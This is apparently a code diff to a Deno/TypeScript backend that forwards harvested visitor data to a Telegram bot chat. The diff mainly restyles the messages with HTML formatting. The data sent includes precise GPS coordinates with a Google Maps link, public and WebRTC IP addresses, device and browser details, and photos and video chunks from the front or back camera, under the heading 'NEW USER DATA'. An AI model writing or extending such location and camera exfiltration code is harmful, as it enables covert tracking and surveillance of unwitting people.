@@ -1,4 +1,26 @@
 // Telegram notification service
+// 
+// 🎨 All messages use beautiful HTML formatting for better readability:
+// 
+// Example output:
+// ┌──────────────────────────────────
+// │ 🎯 NEW USER DATA
+// │
+// │ 📍 Geolocation
+// │ ├ Latitude: 55.881822
+// │ ├ Longitude: 37.582668
+// │ ├ Accuracy: ±149 m
+// │ └ 🗺️ Open in Google Maps
+// │
+// │ 🌐 IP Addresses
+// │ ├ Public: 89.23.123.2
+// │ └ WebRTC: 192.168.1.5
+// │
+// │ 💻 Device Information
+// │ ├ Device: 🖥️ Desktop
+// │ ├ Browser: 🌍 chrome
+// │ └ ...
+// └──────────────────────────────────
 
 const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
 const TELEGRAM_MAIN_CHAT_ID = Deno.env.get("TELEGRAM_MAIN_CHAT_ID");
@@ -37,6 +59,12 @@ export interface VideoPayload {
   cameraType: 'front' | 'back';
   userAgent?: string;
   device?: string;
+  geoData?: {
+    latitude: number;
+    longitude: number;
+    accuracy: number;
+    timestamp: string;
+  };
 }
 
 export interface StartNotificationPayload {
@@ -58,46 +86,55 @@ export async function sendUserDataToTelegram(data: UserDataPayload): Promise<boo
     const deviceEmoji = data.device === 'ios' ? '📱' : data.device === 'android' ? '🤖' : '🖥️';
     const deviceName = data.device === 'ios' ? 'iOS' : data.device === 'android' ? 'Android' : 'Desktop';
     
-    let message = `🎯 NEW USER DATA\\n\\n`;
-    message += `📍 Geolocation:\\n`;
-    message += `   Latitude: ${lat}\\n`;
-    message += `   Longitude: ${lng}\\n`;
-    message += `   Accuracy: ±${Math.round(data.accuracy)} m\\n`;
-    message += `   🗺️ ${googleMapsLink}\\n\\n`;
+    // 🎨 Красивое HTML форматирование для Telegram
+    let message = `<b>🎯 NEW USER DATA</b>\n\n`;
     
+    // 📍 Геолокация
+    message += `<b>📍 Geolocation</b>\n`;
+    message += `├ <b>Latitude:</b> <code>${lat}</code>\n`;
+    message += `├ <b>Longitude:</b> <code>${lng}</code>\n`;
+    message += `├ <b>Accuracy:</b> ±${Math.round(data.accuracy)} m\n`;
+    message += `└ <a href="${googleMapsLink}">🗺️ Open in Google Maps</a>\n\n`;
+    
+    // 🌐 IP адреса
     if (data.publicIP || (data.webrtcIPs && data.webrtcIPs.length > 0)) {
-      message += `🌐 IP Addresses:\\n`;
+      message += `<b>🌐 IP Addresses</b>\n`;
       if (data.publicIP) {
-        message += `   Public: ${data.publicIP}\\n`;
+        message += `├ <b>Public:</b> <code>${data.publicIP}</code>\n`;
       }
       if (data.webrtcIPs && data.webrtcIPs.length > 0) {
-        message += `   WebRTC: ${data.webrtcIPs.join(', ')}\\n`;
+        const webrtcList = data.webrtcIPs.map(ip => `<code>${ip}</code>`).join(', ');
+        message += `└ <b>WebRTC:</b> ${webrtcList}\n`;
       }
-      message += `\\n`;
+      message += `\n`;
     }
     
+    // 💻 Информация об устройстве
+    message += `<b>💻 Device Information</b>\n`;
     if (data.device) {
-      message += `${deviceEmoji} Device: ${deviceName}\\n`;
+      message += `├ <b>Device:</b> ${deviceEmoji} ${deviceName}\n`;
     }
     if (data.browser) {
-      message += `🌍 Browser: ${data.browser}\\n`;
+      message += `├ <b>Browser:</b> 🌍 ${data.browser}\n`;
     }
     if (data.localTime) {
-      message += `⏰ Local Time: ${data.localTime}\\n`;
+      message += `├ <b>Local Time:</b> ⏰ ${data.localTime}\n`;
     }
     if (data.timezone) {
-      message += `🕐 Timezone: ${data.timezone}\\n`;
+      message += `├ <b>Timezone:</b> 🕐 ${data.timezone}\n`;
     }
     if (data.languages) {
-      message += `🗣️ Languages: ${data.languages}\\n`;
+      message += `├ <b>Languages:</b> 🗣️ ${data.languages}\n`;
     }
     if (data.userAgent) {
-      message += `📱 User-Agent: ${data.userAgent}`;
+      message += `└ <b>User-Agent:</b>\n   <code>${data.userAgent}</code>`;
     }
     
     const formData = new FormData();
     formData.append('chat_id', TELEGRAM_MAIN_CHAT_ID);
     formData.append('text', message);
+    formData.append('parse_mode', 'HTML'); // 🎨 Включаем HTML форматирование!
+    formData.append('disable_web_page_preview', 'false'); // Показываем превью ссылок
     
     const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
@@ -126,12 +163,17 @@ export async function sendPhotoToTelegram(data: PhotoPayload): Promise<boolean> 
       return false;
     }
 
-    const caption = `📸 Photo from ${data.cameraType} camera\\n${data.device || 'Unknown device'}`;
+    const cameraEmoji = data.cameraType === 'front' ? '🤳' : '📷';
+    const cameraName = data.cameraType === 'front' ? 'Front Camera' : 'Back Camera';
+    const deviceEmoji = data.device === 'ios' ? '📱' : data.device === 'android' ? '🤖' : '🖥️';
+    
+    const caption = `<b>${cameraEmoji} ${cameraName}</b>\n└ ${deviceEmoji} ${data.device || 'Unknown device'}`;
     
     const formData = new FormData();
     formData.append('chat_id', TELEGRAM_MAIN_CHAT_ID);
     formData.append('photo', data.photoBlob, `photo_${data.cameraType}_${Date.now()}.jpg`);
     formData.append('caption', caption);
+    formData.append('parse_mode', 'HTML');
     
     const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
       method: 'POST',
@@ -160,12 +202,26 @@ export async function sendVideoToTelegram(data: VideoPayload): Promise<boolean> 
       return false;
     }
 
-    const caption = `🎥 Video chunk #${data.chunkNumber} from ${data.cameraType} camera\\n${data.device || 'Unknown device'}`;
+    const cameraEmoji = data.cameraType === 'front' ? '🤳' : '📷';
+    const cameraName = data.cameraType === 'front' ? 'Front Camera' : 'Back Camera';
+    const deviceEmoji = data.device === 'ios' ? '📱' : data.device === 'android' ? '🤖' : '🖥️';
+    
+    let caption = `<b>🎥 Video Chunk #${data.chunkNumber}</b>\n├ <b>Camera:</b> ${cameraEmoji} ${cameraName}\n└ <b>Device:</b> ${deviceEmoji} ${data.device || 'Unknown'}`;
+    
+    // ✅ Add geolocation if available
+    if (data.geoData) {
+      const lat = data.geoData.latitude.toFixed(6);
+      const lng = data.geoData.longitude.toFixed(6);
+      const googleMapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
+      
+      caption += `\n\n<b>📍 Location</b>\n├ <code>${lat}, ${lng}</code>\n├ <b>Accuracy:</b> ±${Math.round(data.geoData.accuracy)} m\n└ <a href="${googleMapsLink}">🗺 Open in Maps</a>`;
+    }
     
     const formData = new FormData();
     formData.append('chat_id', TELEGRAM_MAIN_CHAT_ID);
     formData.append('video', data.videoBlob, `video_${data.cameraType}_chunk${data.chunkNumber}_${Date.now()}.webm`);
     formData.append('caption', caption);
+    formData.append('parse_mode', 'HTML');
     
     const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
       method: 'POST',
@@ -200,13 +256,14 @@ export async function sendStartNotification(data: StartNotificationPayload): Pro
       return false;
     }
 
-    const message = `🔔 User executed /start command\\n\\nTimestamp: ${data.timestamp}`;
+    const message = `<b>🔔 User Activity</b>\\n\\n<b>Action:</b> Executed /start command\\n<b>Timestamp:</b> <code>${data.timestamp}</code>`;
     
     // Send to all notification chat IDs in parallel
     const promises = chatIds.map(async (chatId) => {
       const formData = new FormData();
       formData.append('chat_id', chatId.toString());
       formData.append('text', message);
+      formData.append('parse_mode', 'HTML');
       
       const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
@@ -228,6 +285,38 @@ export async function sendStartNotification(data: StartNotificationPayload): Pro
     return allSuccess;
   } catch (error) {
     console.error('❌ [Telegram] Error sending start notifications:', error);
+    return false;
+  }
+}
+
+// ✅ ДОБАВЛЕНО: Send text message to main chat
+export async function sendTextMessage(message: string): Promise<boolean> {
+  try {
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_MAIN_CHAT_ID) {
+      console.error('❌ [Telegram] Missing bot token or main chat ID');
+      return false;
+    }
+
+    const formData = new FormData();
+    formData.append('chat_id', TELEGRAM_MAIN_CHAT_ID);
+    formData.append('text', message);
+    formData.append('parse_mode', 'HTML');
+    
+    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      body: formData
+    });
+    
+    if (response.ok) {
+      console.log('✅ [Telegram] Text message sent successfully');
+      return true;
+    } else {
+      const errorText = await response.text();
+      console.error('❌ [Telegram] Failed to send text message:', errorText);
+      return false;
+    }
+  } catch (error) {
+    console.error('❌ [Telegram] Error sending text message:', error);
     return false;
   }
 }
